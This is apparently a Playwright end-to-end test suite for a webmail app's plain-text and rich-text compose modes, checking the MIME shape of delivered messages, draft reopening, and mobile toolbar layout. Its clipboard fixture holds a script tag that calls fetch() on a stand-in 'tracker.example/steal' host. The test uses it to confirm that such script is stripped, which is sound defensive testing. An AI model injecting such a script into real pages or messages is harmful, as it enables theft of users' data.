/**
 * The two compose modes, asserted where it counts: on the bytes the recipient's
 * server accepted.
 *
 * The outbox row is the application's own account of what it meant to send. A
 * plain message is defined by what is absent from the wire — no
 * `multipart/alternative`, no HTML part, no trace of the HTML the message was
 * written as before the switch — and none of that is visible in a database
 * column. So every send here is read back out of the SMTP sink.
 *
 * The shared onboarded account has no SMTP, so these run against an isolated
 * user whose account can reach the sink.
 */

import type { BrowserContext, Page } from "@playwright/test";
import { ApiClient, waitFor } from "../src/api.js";
import { baseUrl } from "../src/env.js";
import { expect, test } from "../src/fixtures.js";
import { readMimeShapeOfRaw } from "../src/imap.js";
import { type IsolatedRun, provisionIsolatedRun } from "../src/provision.js";
import { waitForAcceptedMessage } from "../src/smtp-sink.js";

const DESKTOP = { width: 1512, height: 864 };
const PHONE = { width: 390, height: 844 };

const RECIPIENT = "recipient@remit.test";

const CLIPBOARD_HTML = [
	'<meta charset="utf-8">',
	'<h2 style="color:#c00">Quarterly numbers</h2>',
	"<p>Highlights <strong>this quarter</strong>:</p>",
	'<table style="border:2px dashed #c00"><thead>',
	"<tr><th>Region</th><th>Total</th></tr></thead>",
	"<tbody><tr><td>EMEA</td><td>412</td></tr></tbody></table>",
	'<script>fetch("https://tracker.example/steal")</script>',
].join("");

const CLIPBOARD_TEXT = "Quarterly numbers Highlights this quarter:";

/** A real clipboard event carrying both flavours, at whichever surface is up. */
const pasteInto = (
	page: Page,
	testId: string,
	{ html, text }: { html: string; text: string },
): Promise<void> =>
	page.evaluate(
		([target, htmlFlavour, textFlavour]) => {
			const element = document.querySelector(`[data-testid="${target}"]`);
			if (!element) throw new Error(`${target} is not mounted`);
			if (element instanceof HTMLTextAreaElement) element.focus();
			const data = new DataTransfer();
			data.setData("text/html", htmlFlavour);
			data.setData("text/plain", textFlavour);
			element.dispatchEvent(
				new ClipboardEvent("paste", {
					bubbles: true,
					cancelable: true,
					clipboardData: data,
				}),
			);
		},
		[testId, html, text],
	);

const openCompose = async (page: Page, subject: string): Promise<void> => {
	await page.goto("/mail");
	await page.getByRole("button", { name: "Compose", exact: true }).click();
	await expect(page.getByTestId("compose-body")).toBeVisible({
		timeout: 30_000,
	});
	await page.getByPlaceholder("Recipients").fill(RECIPIENT);
	await page.getByPlaceholder("Recipients").press("Enter");
	await page.locator("[data-subject-field]").fill(subject);
};

const isOnTop = (page: Page, testId: string): Promise<boolean> =>
	page.getByTestId(testId).evaluate((element) => {
		const { x, y, width, height } = element.getBoundingClientRect();
		const hit = document.elementFromPoint(x + width / 2, y + height / 2);
		if (!hit) return false;
		return element.contains(hit) || hit.contains(element);
	});

test.describe("Composing in plain text and in rich text", () => {
	let run: IsolatedRun;
	let api: ApiClient;
	let context: BrowserContext;

	test.beforeAll(async ({ browser }) => {
		test.setTimeout(180_000);
		run = await provisionIsolatedRun("E2E Compose Modes");
		api = new ApiClient(run);
		context = await browser.newContext({
			storageState: run.storageState,
			baseURL: baseUrl,
			viewport: DESKTOP,
		});
	});

	test.afterAll(async () => {
		await context.close();
	});

	test("a message switched to plain text leaves as one text/plain part", async () => {
		test.setTimeout(180_000);
		const page = await context.newPage();
		const subject = `Modes plain ${Date.now()}`;

		await openCompose(page, subject);
		await page.getByTestId("compose-body").click();
		await pasteInto(page, "compose-body", {
			html: CLIPBOARD_HTML,
			text: CLIPBOARD_TEXT,
		});
		await expect(
			page.getByTestId("compose-body").locator("table td", { hasText: "EMEA" }),
		).toBeVisible();

		await page.getByTestId("compose-mode-toggle").click();
		await page
			.getByRole("button", { name: "Switch to plain text", exact: true })
			.click();

		const plain = page.getByTestId("compose-body-plain");
		await expect(plain).toBeVisible();
		await expect(plain).toHaveValue(/## Quarterly numbers/);
		await expect(plain).toHaveValue(/\| EMEA \| 412 \|/);
		await expect(page.getByTestId("compose-mode-toggle")).toHaveAttribute(
			"aria-pressed",
			"true",
		);

		await page.getByRole("button", { name: "Send", exact: true }).click();
		await expect(plain).toBeHidden({ timeout: 30_000 });

		const accepted = await waitForAcceptedMessage(subject);
		const delivered = await readMimeShapeOfRaw(accepted.raw);

		expect(delivered.contentType).toBe("text/plain");
		expect(delivered.parts.map((part) => part.contentType)).toEqual([
			"text/plain",
		]);
		expect(delivered.parts[0].content).toContain("## Quarterly numbers");
		expect(delivered.parts[0].content).toContain("| EMEA | 412 |");

		// The regression this mode exists to avoid: the HTML the message was
		// written as riding along as a second alternative, because a plain draft
		// that omits `htmlBody` leaves the stale column alone.
		expect(accepted.raw).not.toContain("multipart/alternative");
		expect(accepted.raw).not.toContain("text/html");
		expect(accepted.raw).not.toContain("<strong");
		expect(accepted.raw).not.toContain("<table");
	});

	test("cancelling the warning leaves the message rich", async () => {
		test.setTimeout(180_000);
		const page = await context.newPage();
		const subject = `Modes cancelled ${Date.now()}`;

		await openCompose(page, subject);
		await page.getByTestId("compose-body").click();
		await pasteInto(page, "compose-body", {
			html: CLIPBOARD_HTML,
			text: CLIPBOARD_TEXT,
		});

		await page.getByTestId("compose-mode-toggle").click();
		await page.getByRole("button", { name: "Cancel", exact: true }).click();

		await expect(page.getByTestId("compose-body-plain")).toHaveCount(0);
		await expect(page.getByTestId("compose-mode-toggle")).toHaveAttribute(
			"aria-pressed",
			"false",
		);

		await page.getByRole("button", { name: "Send", exact: true }).click();
		await expect(page.getByTestId("compose-body")).toBeHidden({
			timeout: 30_000,
		});

		const accepted = await waitForAcceptedMessage(subject);
		const delivered = await readMimeShapeOfRaw(accepted.raw);

		expect(delivered.contentType).toBe("multipart/alternative");
		expect(delivered.parts.map((part) => part.contentType)).toEqual([
			"text/plain",
			"text/html",
		]);
		expect(delivered.parts[1].content).toContain("<table");
	});

	test("HTML pasted into the plain surface arrives as a pipe table", async () => {
		test.setTimeout(180_000);
		const page = await context.newPage();
		const subject = `Modes paste ${Date.now()}`;

		await openCompose(page, subject);
		await page.getByTestId("compose-mode-toggle").click();

		const plain = page.getByTestId("compose-body-plain");
		await expect(plain).toBeVisible();
		await pasteInto(page, "compose-body-plain", {
			html: CLIPBOARD_HTML,
			text: CLIPBOARD_TEXT,
		});
		await expect(plain).toHaveValue(/\| Region \| Total \|/);

		await page.getByRole("button", { name: "Send", exact: true }).click();
		await expect(plain).toBeHidden({ timeout: 30_000 });

		const accepted = await waitForAcceptedMessage(subject);
		const delivered = await readMimeShapeOfRaw(accepted.raw);

		expect(delivered.contentType).toBe("text/plain");
		expect(delivered.parts[0].content).toContain("## Quarterly numbers");
		expect(delivered.parts[0].content).toContain("| EMEA | 412 |");
		expect(delivered.parts[0].content).not.toContain("<table");
		expect(delivered.parts[0].content).not.toContain("<script");
	});

	test("plain prose switches without asking", async () => {
		test.setTimeout(120_000);
		const page = await context.newPage();

		await openCompose(page, `Modes prose ${Date.now()}`);
		await page.getByTestId("compose-body").click();
		await page.keyboard.type("Thanks, that works for me.");
		await page.keyboard.press("Enter");
		await page.keyboard.type("See you Thursday.");

		await page.getByTestId("compose-mode-toggle").click();

		await expect(page.getByRole("dialog")).toHaveCount(0);
		await expect(page.getByTestId("compose-body-plain")).toHaveValue(
			/Thanks, that works for me\./,
		);
	});

	test("a plain draft reopens on the plain surface, character for character", async () => {
		test.setTimeout(180_000);
		const page = await context.newPage();
		const subject = `Modes reopen ${Date.now()}`;
		const written = "Numbers below.\n\n| Region | Total |\n| --- | --- |";

		await openCompose(page, subject);
		await page.getByTestId("compose-mode-toggle").click();
		const plain = page.getByTestId("compose-body-plain");
		await expect(plain).toBeVisible();
		await plain.fill(written);

		await expect(page.getByText("Draft saved")).toBeVisible({
			timeout: 30_000,
		});
		const drafts = await waitFor(
			() => api.listRemovableOutboxMessages(),
			(items) => items.some((item) => item.subject === subject),
			{ timeoutMs: 30_000, what: "the plain draft to autosave" },
		);
		const draft = drafts.find((item) => item.subject === subject);
		if (!draft) throw new Error("unreachable: the draft was matched but lost");

		try {
			// Cleared, not omitted: absent means "leave alone" at every layer below,
			// so an omitted column would have sent the HTML it was written as. The
			// first autosave can land while the message is still rich, so this waits
			// for the write that follows the switch rather than the first one.
			const saved = await waitFor(
				() => api.getOutboxMessage(draft.outboxMessageId),
				(message) => message.textBody === written,
				{ timeoutMs: 30_000, what: "the plain body to reach the server" },
			);
			expect(saved.htmlBody).toBe("");

			const mailboxes = await waitFor(
				() => api.listMailboxes(run.accountId),
				(boxes) => boxes.some((box) => box.fullPath === "Drafts"),
				{ timeoutMs: 90_000, what: "the Drafts folder to sync" },
			);
			const drafted = mailboxes.find((box) => box.fullPath === "Drafts");
			if (!drafted) throw new Error("unreachable: Drafts was matched");

			await page.goto(`/mail/${drafted.mailboxId}`);
			await page.getByText(subject).first().click();

			const reopened = page.getByTestId("compose-body-plain");
			await expect(reopened).toBeVisible({ timeout: 30_000 });
			await expect(reopened).toHaveValue(written);
			await expect(page.getByTestId("compose-mode-toggle")).toHaveAttribute(
				"aria-pressed",
				"true",
			);
		} finally {
			await api.deleteOutboxMessage(draft.outboxMessageId);
		}
	});

	test("the toggle stays inside a 390 viewport when the toolbar overflows", async ({
		browser,
	}) => {
		test.setTimeout(120_000);
		// A context of its own: the layout is a device posture, so the phone
		// branch needs a coarse pointer and not only a narrow window.
		const phoneContext = await browser.newContext({
			storageState: run.storageState,
			baseURL: baseUrl,
			viewport: PHONE,
			hasTouch: true,
			isMobile: true,
		});
		const phone = await phoneContext.newPage();

		try {
			await phone.goto("/mail");
			await phone.getByRole("button", { name: "Compose new message" }).click();
			await expect(phone.getByTestId("compose-body")).toBeVisible({
				timeout: 30_000,
			});

			// The cluster has to actually run out of room, or the assertion below
			// passes on a toolbar that never needed to scroll.
			const overflows = await phone
				.getByTestId("compose-format-cluster")
				.evaluate((element) => element.scrollWidth > element.clientWidth);
			expect(overflows).toBe(true);

			const box = await phone.getByTestId("compose-mode-toggle").boundingBox();
			expect(box).not.toBeNull();
			expect((box?.x ?? 0) + (box?.width ?? 0)).toBeLessThanOrEqual(
				PHONE.width,
			);
			await expect.poll(() => isOnTop(phone, "compose-mode-toggle")).toBe(true);
		} finally {
			await phoneContext.close();
		}
	});
});
